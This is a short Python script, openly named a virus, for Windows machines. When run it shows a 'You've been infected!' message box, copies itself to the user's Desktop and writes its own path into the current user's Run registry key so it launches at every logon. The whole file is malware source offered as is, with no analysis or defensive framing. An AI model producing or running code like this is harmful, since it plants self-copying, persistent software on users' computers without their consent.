import os
import ctypes
import shutil
import winreg

# Function to show a message box
def show_message():
    ctypes.windll.user32.MessageBoxW(0, "You've been infected!", "Virus Alert", 1)

# Function to replicate the virus
def replicate_virus():
    source = os.path.abspath(__file__)
    destination = os.path.join(os.getenv('USERPROFILE'), 'Desktop', 'virus.py')
    shutil.copyfile(source, destination)

# Function to add virus to startup
def add_to_startup():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'Virus', 0, winreg.REG_SZ, os.path.abspath(__file__))
    winreg.CloseKey(key)

if __name__ == "__main__":
    show_message()
    replicate_virus()
    add_to_startup()
